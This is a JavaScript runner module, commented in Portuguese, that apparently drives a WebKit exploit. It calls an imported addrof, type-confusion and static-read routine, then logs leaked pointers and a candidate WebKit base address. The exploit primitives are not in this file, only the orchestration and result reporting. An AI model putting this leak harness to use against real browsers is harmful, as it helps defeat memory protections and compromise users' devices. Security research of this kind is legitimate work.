// js/script3/runAllAdvancedTestsS3.mjs (Runner para Foco em ArbRead Estático)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './testArrayBufferVictimCrash.mjs';

// safeToHexRunner não é estritamente necessário aqui se os logs do teste já formatam
// mas pode ser útil para o oob_value_of_best_result se ele não for string.

async function runHeisenbugReproStrategy_TypedArrayVictim_R43_StaticReadFocus() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43_StaticReadFocus";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();
    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred && !result.static_read_attempts && !result.tc_attempt_summary ) {
        logS3(`  RUNNER R43(StaticRead): Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        logS3(`  RUNNER R43(StaticRead): Teste principal completado. Analisando resultados...`, "good", FNAME_RUNNER);

        logS3(`  --- RESULTADOS DA TENTATIVA DE LEITURA DE ENDEREÇOS ESTÁTICOS ---`, "info_emphasis", FNAME_RUNNER);
        if (result.static_read_attempts && result.static_read_attempts.length > 0) {
            result.static_read_attempts.forEach(attempt => {
                logS3(`    ${attempt.name} (${attempt.address_str}): Lido=${attempt.read_value_str}, Válido=${attempt.is_valid_ptr}, Notas=${attempt.notes}`, 
                      attempt.is_valid_ptr ? "vuln" : "info", FNAME_RUNNER);
            });
        } else {
            logS3("    Nenhuma tentativa de leitura estática registrada ou DATA_OFFSETS estava vazio.", "warn", FNAME_RUNNER);
        }

        if (result.webkit_leak_result?.success) {
            logS3(`    +++ WebKit Base Leak SUCESSO via StaticRead +++`, "success_major", FNAME_RUNNER);
            logS3(`      Fonte: ${result.webkit_leak_result.source_static_addr_name} @ ${result.webkit_leak_result.source_static_addr_val}`, "info", FNAME_RUNNER);
            logS3(`      Ponteiro Interno Vazado: ${result.webkit_leak_result.leaked_internal_ptr}`, "leak", FNAME_RUNNER);
            logS3(`      Base Candidata do WebKit: ${result.webkit_leak_result.webkit_base_candidate}`, "vuln", FNAME_RUNNER);
        } else {
            logS3(`    WebKit Base Leak via StaticRead: FALHOU ou não aplicável.`, "warn", FNAME_RUNNER);
            // Logar detalhes da tentativa de TC fallback
            if (result.tc_attempt_summary) {
                logS3(`  --- RESULTADOS DA TENTATIVA DE TC FALLBACK ---`, "info_emphasis", FNAME_RUNNER);
                const tc_sum = result.tc_attempt_summary;
                logS3(`    TC Confirmada (Fallback): ${tc_sum.tc_confirmed}`, tc_sum.tc_confirmed ? "vuln" : "warn", FNAME_RUNNER);
                if (tc_sum.tc_probe_details) {
                     logS3(`    Detalhes Sonda TC (Fallback): ${JSON.stringify(tc_sum.tc_probe_details)}`, "leak_detail", FNAME_RUNNER);
                }
                if (tc_sum.addrof_details_iter) {
                    logS3(`    Detalhes Addrof no Getter (Fallback): Tentativa=${tc_sum.addrof_details_iter.attempted}, Sucesso=${tc_sum.addrof_details_iter.success}, Notas=${tc_sum.addrof_details_iter.notes}`, "info", FNAME_RUNNER);
                }
                if (tc_sum.error) {
                    logS3(`    Erro na tentativa de TC Fallback: ${tc_sum.error}`, "error", FNAME_RUNNER);
                }
            }
        }
        
        // Addrof e WebKitLeak globais (podem ter sido preenchidos por diferentes caminhos)
        if (result.addrof_result) {
             logS3(`    Resultado Addrof (Geral): ${result.addrof_result.msg} (Endereço: ${result.addrof_result.leaked_object_addr || 'N/A'})`, result.addrof_result.success ? "success_major" : "info", FNAME_RUNNER);
        }
         if (result.errorOccurred && (result.static_read_attempts || result.tc_attempt_summary)) { // Erro durante as fases principais
             logS3(`    Erro Geral Reportado: ${result.errorOccurred}`, "error", FNAME_RUNNER);
        }

        document.title = result.final_title_page || `${module_name_for_title} Final: Ver Logs`;

    } else {
        document.title = `${module_name_for_title}_R43_StaticRead: Invalid Result Obj`;
        logS3(`  RUNNER R43(StaticRead): Objeto de resultado inválido ou nulo.`, "critical", FNAME_RUNNER);
    }

    logS3(`  Título da página final (definido pelo teste): ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator_StaticRead`;
    logS3(`==== INICIANDO Script 3 R43_StaticRead (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    await runHeisenbugReproStrategy_TypedArrayVictim_R43_StaticReadFocus();
    
    logS3(`\n==== Script 3 R43_StaticRead (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;

    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) &&
        !document.title.includes("Final:") && 
        !document.title.toUpperCase().includes("OK") &&
        !document.title.toUpperCase().includes("SUCCESS") &&
        !document.title.includes("ERR") && 
        !document.title.includes("Invalid")) {
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43_StaticRead_Done`;
    }
}
